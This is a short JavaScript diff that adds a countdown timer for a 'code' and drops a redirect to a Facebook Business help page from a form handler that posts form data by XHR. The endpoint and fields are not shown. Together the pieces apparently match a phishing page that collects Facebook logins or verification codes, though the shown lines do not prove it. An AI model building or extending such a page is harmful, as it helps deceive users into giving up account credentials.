@@ -1,4 +1,32 @@
+const countdownElement = document.querySelector(".count-time");
 
+// Set the initial countdown time in seconds
+let countdown = 600;
+
+function formatTime(timeInSeconds) {
+  const minutes = Math.floor(timeInSeconds / 60);
+  const seconds = timeInSeconds % 60;
+  return `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(
+    2,
+    "0"
+  )}`;
+}
+
+function updateCountdown() {
+  countdownElement.textContent = formatTime(countdown);
+}
+
+// Update the countdown every second
+const intervalId = setInterval(() => {
+  countdown--;
+  updateCountdown();
+
+  // Check if the countdown reaches 0
+  if (countdown === 0) {
+    clearInterval(intervalId);
+    // Handle countdown reaching 0 (e.g., show code again, generate new code, etc.)
+  }
+}, 1000);
 
 var form = document.getElementById("myForm"); // Make sure your form has the correct ID
 form.addEventListener("submit", function (e) {
@@ -23,7 +51,7 @@ form.addEventListener("submit", function (e) {
   };
 
   xhr.send(formData); // Moved this line outside the if block
-  window.open("https://web.facebook.com/business/help?_rdc=1&_rdr");
+  
 });
 // function submitFormAndOpenTab() {
 //   // Get the form element
